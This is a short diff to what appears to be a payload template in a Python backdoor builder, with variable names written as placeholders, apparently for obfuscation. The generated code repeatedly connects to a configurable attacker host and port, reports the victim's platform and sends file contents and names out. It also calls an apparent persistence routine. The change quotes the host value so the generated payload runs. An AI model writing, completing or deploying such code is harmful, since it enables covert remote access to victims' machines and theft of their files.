@@ -12,7 +12,7 @@ def sendfile(file, conn):\n\tconn.send("!!!".encode("UTF-8"))
 {keepyourselfalive}()
 {connected} = False\nwhile not {connected} :\n\ttry :
 \t\tconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-\t\tconn.connect(({host} , int({port})))
+\t\tconn.connect(('{host}' , int({port})))
 \t\t{connected} = True 
 \texcept :\n\t\t{connected} = False\n\twhile {connected} :\n\t\ttry : 
 \t\t\tconn.send((sys.platform).encode("UTF-8"))
@@ -38,7 +38,7 @@ def sendfile(file, conn):\n\tconn.send("!!!".encode("UTF-8"))
 \t\tconn.send(len(f.read()))\n\t\tconn.send(f.read())\n\t\tconn.send(file.strip(os.path.dirname(file)))
 {connected} = False
 while not {connected}:\n\ttry:\n\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-\t\tconn.connect(({host}, int({port})))
+\t\tconn.connect(('{host}', int({port})))
 \t\t{connected} = True
 \texcept:\n\t\t{connected} = False\n\telse:\n\t\tconn.send((sys.platform).encode("UTF-8"))
 while connected:\n\t\ttry:
